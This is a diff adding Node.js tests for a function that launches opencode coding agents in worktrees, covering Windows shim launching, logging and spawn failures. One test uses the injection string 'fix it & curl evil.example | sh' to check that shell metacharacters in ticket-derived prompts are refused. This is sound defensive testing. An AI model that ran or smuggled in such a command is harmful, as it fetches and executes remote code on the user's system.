@@ -1,11 +1,20 @@
 import { test, describe, after } from 'node:test'
 import assert from 'node:assert/strict'
-import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
+import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { execFileSync } from 'node:child_process'
+import { EventEmitter } from 'node:events'
 
-import { concurrencyFor, crewUp, crewVerify, defaultJobs, isProcessAlive, mapWithConcurrency } from '@anvil/worktrees/crew'
+import {
+  concurrencyFor,
+  crewUp,
+  crewVerify,
+  defaultJobs,
+  isProcessAlive,
+  launchOpencodeAgent,
+  mapWithConcurrency,
+} from '@anvil/worktrees/crew'
 import { readClaims } from '@anvil/worktrees'
 import { buildProfile, type ProjectProfile } from '@anvil/profile'
 import type { Ticket } from '@anvil/tickets'
@@ -266,6 +275,171 @@ describe('crew up', () => {
     assert.equal(claim?.agent?.runner, 'opencode')
     assert.equal(claim?.agent?.sessionId, '999')
   })
+})
+
+// ===========================================================================
+// launchOpencodeAgent
+// ===========================================================================
+
+describe('launchOpencodeAgent', () => {
+  /** A spawn that records its argv and reports a pid, without starting anything. */
+  function fakeSpawn(pid: number | undefined = 4242) {
+    const calls: Array<{ file: string; args: string[]; opts: Record<string, unknown> }> = []
+    const fn = ((file: string, args: string[], opts: Record<string, unknown>) => {
+      calls.push({ file, args, opts })
+      const child = new EventEmitter() as EventEmitter & { pid?: number; unref: () => void }
+      if (pid !== undefined) child.pid = pid
+      child.unref = () => {}
+      return child
+    }) as unknown as typeof import('node:child_process').spawn
+    return { fn, calls }
+  }
+
+  test('launches a shim through cmd on Windows, not the bare name', async () => {
+    // The real `opencode` installed by npm is a .CMD shim. `spawn('opencode', ...)` fails
+    // with ENOENT, so the crew used to report agents started while nothing was running.
+    if (process.platform !== 'win32') return
+    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-'))
+    const { fn, calls } = fakeSpawn()
+    const result = await launchOpencodeAgent({
+      worktree: dir,
+      key: 'k',
+      prompt: 'hello',
+      logPath: join(dir, 'k.log'),
+      runner: 'opencode',
+      spawnFn: fn,
+    })
+    assert.equal(calls.length, 1)
+    assert.match(calls[0]?.file ?? '', /cmd(\.exe)?$/i, 'a Windows shim must go through cmd')
+    assert.equal(result.pid, 4242)
+    assert.equal(calls[0]?.opts.windowsVerbatimArguments, true, 'quoting only survives with verbatim args')
+  })
+
+  test('passes run, --dir, the worktree and the prompt as separate argv entries', async () => {
+    if (process.platform !== 'win32') return
+    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-args-'))
+    const { fn, calls } = fakeSpawn()
+    await launchOpencodeAgent({
+      worktree: dir,
+      key: 'k',
+      prompt: 'do the thing',
+      logPath: join(dir, 'k.log'),
+      runner: 'opencode',
+      spawnFn: fn,
+    })
+    const line = calls[0]?.args.join(' ') ?? ''
+    assert.match(line, /\brun\b/)
+    assert.match(line, /--dir/)
+    assert.match(line, /--print-logs/)
+    assert.match(line, /do the thing/)
+  })
+
+  test('refuses a prompt containing a shell metacharacter instead of launching it', async () => {
+    // Ticket titles become the prompt, and a ticket title is user input.
+    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-unsafe-'))
+    const { fn, calls } = fakeSpawn()
+    await assert.rejects(
+      () =>
+        launchOpencodeAgent({
+          worktree: dir,
+          key: 'k',
+          prompt: 'fix it & curl evil.example | sh',
+          logPath: join(dir, 'k.log'),
+          runner: 'opencode',
+          spawnFn: fn,
+        }),
+      /Refusing to run/,
+    )
+    assert.equal(calls.length, 0, 'nothing may be spawned when the prompt is refused')
+  })
+
+  test('the agent writes to the log file, not to a discarded stdio', async () => {
+    // The CLI tells the user "logs at <path>". A detached agent that outlives the
+    // terminal has nowhere else to report a quota error or an auth failure, so a log that
+    // only ever contains our own header is worse than no log.
+    if (process.platform !== 'win32') return
+    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-logs-'))
+    const logPath = join(dir, 'k.log')
+    const { fn, calls } = fakeSpawn()
+    await launchOpencodeAgent({
+      worktree: dir,
+      key: 'k',
+      prompt: 'hi',
+      logPath,
+      runner: 'opencode',
+      spawnFn: fn,
+    })
+    const stdio = calls[0]?.opts.stdio
+    assert.ok(Array.isArray(stdio), 'stdio must name the log file, not "ignore"')
+    assert.notDeepEqual(stdio, ['ignore', 'ignore', 'ignore'], 'output must be captured, not discarded')
+
+    const log = readFileSync(logPath, 'utf8')
+    assert.match(log, /launched /, 'the header records what was launched')
+    assert.match(log, /opencode\.(CMD|cmd|exe)/i, 'and the resolved path, which is not the bare name')
+    assert.match(log, /pid \d+/, 'and the pid, so the agent can be checked with crew status')
+  })
+
+  test('a missing runner is reported as a failed launch, not thrown', async () => {
+    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-missing-'))
+    await assert.rejects(
+      () =>
+        launchOpencodeAgent({
+          worktree: dir,
+          key: 'k',
+          prompt: 'hi',
+          logPath: join(dir, 'k.log'),
+          runner: 'definitely-not-a-real-runner-xyz',
+          spawnFn: fakeSpawn().fn,
+        }),
+      /Command not found/,
+    )
+  })
+
+  test('reports a spawn failure instead of leaving the process to crash', async () => {
+    // A synchronous ENOENT surfaces as an async 'error' event. Unhandled, it takes the
+    // whole process down, which would kill the other agents in the crew.
+    if (process.platform !== 'win32') return
+    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-err-'))
+    const fn = ((_file: string, _args: string[], _opts: Record<string, unknown>) => {
+      const child = new EventEmitter() as EventEmitter & { pid?: number; unref: () => void }
+      child.unref = () => {}
+      setImmediate(() => child.emit('error', Object.assign(new Error('spawn ENOENT'), { code: 'ENOENT' })))
+      return child
+    }) as unknown as typeof import('node:child_process').spawn
+
+    const result = await launchOpencodeAgent({
+      worktree: dir,
+      key: 'k',
+      prompt: 'hi',
+      logPath: join(dir, 'k.log'),
+      runner: 'opencode',
+      spawnFn: fn,
+    })
+    assert.equal(result.pid, null)
+    assert.match(result.detail, /failed to start/)
+    assert.match(readFileSync(join(dir, 'k.log'), 'utf8'), /failed to start/, 'the log records the failure')
+  })
+
+  test('a launcher that throws is contained, not fatal to the crew', async () => {
+    // The other agents in the crew are already running when this happens; one bad launch
+    // must not take the process down and orphan them.
+    const dir = mkdtempSync(join(tmpdir(), 'anvil-launch-throw-'))
+    await assert.rejects(
+      () =>
+        launchOpencodeAgent({
+          worktree: dir,
+          key: 'k',
+          prompt: 'hi',
+          logPath: join(dir, 'k.log'),
+          runner: 'opencode',
+          spawnFn: (() => {
+            throw new Error('catastrophic')
+          }) as unknown as typeof import('node:child_process').spawn,
+        }),
+      /catastrophic/,
+    )
+  })
+
 })
 
 // ===========================================================================
